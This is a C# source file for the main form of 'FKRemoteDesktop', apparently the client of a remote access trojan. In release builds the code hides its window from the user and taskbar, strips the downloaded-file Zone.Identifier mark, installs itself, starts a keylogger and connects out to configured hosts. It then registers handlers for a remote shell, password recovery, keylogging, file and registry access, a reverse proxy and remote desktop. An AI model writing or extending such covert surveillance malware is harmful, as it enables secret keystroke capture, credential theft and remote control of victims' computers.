using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Framework;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Install;
using FKRemoteDesktop.KeyLogger;
using FKRemoteDesktop.Message;
using FKRemoteDesktop.Message.SubMessageHandler;
using FKRemoteDesktop.Network;
using FKRemoteDesktop.UserActivity;
using FKRemoteDesktop.Utilities;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop
{
    public partial class ClientForm : Form
    {
        private delegate void SafeAddLogDelegate(ELogType msgType, string msg);

        public SingleInstanceMutex ApplicationMutex;                    // 进程互斥锁，保证本进程同一时间的只会运行一个
        private FKClient _connectClient;                                // 用于连接服务器的客户端对象
        private readonly List<IMessageProcessor> _messageProcessors;    // 一个消息处理器的列表
        private KeyloggerService _keyloggerService;                     // 用于捕获和存储用户键盘记录的后台服务
        private ActivityDetection _userActivityDetection;               // 用户行为记录器（ Idle 或 Active ）

        public ClientForm()
        {
#if DEBUG
            InitializeComponent();
            this.Visible = true;     // 客户端可见模式
#else
            this.Visible = false;
            this.ShowInTaskbar = false;
            this.Opacity = 0;
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Minimized;
#endif

            Logger.OnLog += AddLog; // 订阅 Logger 事件
            _messageProcessors = new List<IMessageProcessor>();
        }

        private bool IsInstallationRequired()
        {
            // 防止无限重复
            return SettingsFromServer.INSTALL && SettingsFromClient.INSTALLPATH != Application.ExecutablePath;
        }

        protected override void OnLoad(EventArgs e)
        {
            Init();
            base.OnLoad(e);
        }

        // 添加 DEBUG 调试信息
        private void AddLog(ELogType msgType, string msg)
        {
#if DEBUG
            if (richTextBox_log.InvokeRequired)
            {
                var d = new SafeAddLogDelegate(AddLog);
                richTextBox_log.Invoke(d, new object[] { msgType, msg });
            }
            else
            {
                string timeStamp = DateTime.Now.ToString("[yyyy/MM/dd HH:mm:ss.fff]  ");
                richTextBox_log.AppendText(timeStamp);

                // 保存当前选择位置
                int selectionStart = richTextBox_log.SelectionStart;
                int selectionLength = richTextBox_log.SelectionLength;

                // 设置颜色
                switch (msgType)
                {
                    case ELogType.eLogType_Info:
                        richTextBox_log.SelectionColor = Color.Black;
                        break;

                    case ELogType.eLogType_Warning:
                        richTextBox_log.SelectionColor = Color.OrangeRed;
                        break;

                    case ELogType.eLogType_Debug:
                        richTextBox_log.SelectionColor = Color.Gray;
                        break;

                    case ELogType.eLogType_Error:
                        richTextBox_log.SelectionColor = Color.Red;
                        break;
                }

                // 添加消息并换行
                richTextBox_log.AppendText(msg + Environment.NewLine);

                // 恢复默认颜色
                richTextBox_log.SelectionColor = richTextBox_log.ForeColor;

                // 恢复选择位置
                richTextBox_log.SelectionStart = selectionStart;
                richTextBox_log.SelectionLength = selectionLength;

                // 自动滚动到最新行
                richTextBox_log.ScrollToCaret();
            }
#endif
        }

        // 初始化
        private void Init()
        {
            Logger.Log(ELogType.eLogType_Info, "开始初始化进程...");

            // 检查设置
            if (!SettingsFromServer.Initialize())
                Environment.Exit(1);
            Logger.Log(ELogType.eLogType_Info, "加载设置信息完成.");
            Logger.Log(ELogType.eLogType_Debug, "客户端配置信息: \r" + SettingsFromServer.ToString());

            // 检查互斥锁，本进程是否在电脑上已经运行
            ApplicationMutex = new SingleInstanceMutex(SettingsFromServer.MUTEX);
            if (!ApplicationMutex.CreatedNew)
                Environment.Exit(2);
            Logger.Log(ELogType.eLogType_Debug, "本进程是唯一进程.");

            // 删除ZoneIndetifier文件
            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
            Logger.Log(ELogType.eLogType_Debug, "删除 .Zone.Identifier 文件完成.");

            // 进行安装
            var installer = new ClientInstaller();
            if (IsInstallationRequired())
            {
                ApplicationMutex.Dispose();
                Logger.Log(ELogType.eLogType_Info, "开始进行客户端安装.");
                try
                {
                    installer.Install();
                    Environment.Exit(3);
                }
                catch (Exception e)
                {
                    Logger.Log(ELogType.eLogType_Error, "安装客户端失败: " + e.ToString());
                }
            }
            else
            {
                if (SettingsFromServer.INSTALL)
                {
                    Logger.Log(ELogType.eLogType_Debug, "客户端已安装至: " + SettingsFromClient.INSTALLPATH);
                }

                Logger.Log(ELogType.eLogType_Info, "开始进行客户端设置.");
                try
                {
                    // 重新应用客户端设置
                    installer.ApplySettings();
                }
                catch (Exception e)
                {
                    Logger.Log(ELogType.eLogType_Error, "更新客户端设置失败: " + e.ToString());
                }

                if (SettingsFromServer.ENABLELOGGER)
                {
                    Logger.Log(ELogType.eLogType_Info, "开启按键记录.");
                    _keyloggerService = new KeyloggerService();
                    _keyloggerService.Start();
                }
                else
                {
                    Logger.Log(ELogType.eLogType_Warning, "未开启键盘记录功能.");
                }

                var hosts = new HostsManager(HostsConverterHelper.RawHostsToList(SettingsFromServer.HOSTS));
                _connectClient = new FKClient(hosts, SettingsFromServer.SERVERCERTIFICATE);
                _connectClient.ClientState += ConnectClientOnClientState;
                InitializeMessageProcessors(_connectClient);

                _userActivityDetection = new ActivityDetection(_connectClient);
                _userActivityDetection.Start();

                new Thread(() =>
                {
                    // 开启新线程启动网络消息接收
                    _connectClient.ConnectLoop();
                    Environment.Exit(0);
                }).Start();
            }
        }

        private void ConnectClientOnClientState(Client s, bool connected)
        {
            if (connected)
                Logger.Log(ELogType.eLogType_Info, "服务器连接成功.");
            else
                Logger.Log(ELogType.eLogType_Info, "服务器连接断开.");
        }

        // 注册消息处理
        private void InitializeMessageProcessors(FKClient client)
        {
            _messageProcessors.Add(new TestMessageHandler());
            _messageProcessors.Add(new ClientServicesHandler(this, client));
            _messageProcessors.Add(new FileManagerHandler(client));
            _messageProcessors.Add(new MessageBoxHandler());
            _messageProcessors.Add(new SystemInformationHandler());
            _messageProcessors.Add(new WebsiteVisitorHandler());
            _messageProcessors.Add(new RemoteShellHandler(client));
            _messageProcessors.Add(new StartupManagerHandler());
            _messageProcessors.Add(new TaskManagerHandler(client));
            _messageProcessors.Add(new TcpConnectionsHandler());
            _messageProcessors.Add(new RegistryHandler());
            _messageProcessors.Add(new ShutdownHandler());
            _messageProcessors.Add(new ReverseProxyHandler(client));
            _messageProcessors.Add(new PasswordRecoveryHandler());
            _messageProcessors.Add(new KeyloggerHandler());
            _messageProcessors.Add(new RemoteDesktopHandler());

            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Register(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged += ShowNotification;
            }
        }

        private void ShowNotification(object sender, string value)
        {
            Logger.Log(ELogType.eLogType_Info, value);
        }

        // 清理全部消息注册
        private void CleanupMessageProcessors()
        {
            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Unregister(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged -= ShowNotification;
                if (msgProc is IDisposable disposableMsgProc)
                    disposableMsgProc.Dispose();
            }
        }

        // 该函数会在 Designer.cs 中的 Dispose 中被调用
        protected void MyDispose()
        {
            CleanupMessageProcessors();
            _keyloggerService?.Dispose();
            _userActivityDetection?.Dispose();
            ApplicationMutex?.Dispose();
            _connectClient?.Dispose();
        }
    }
}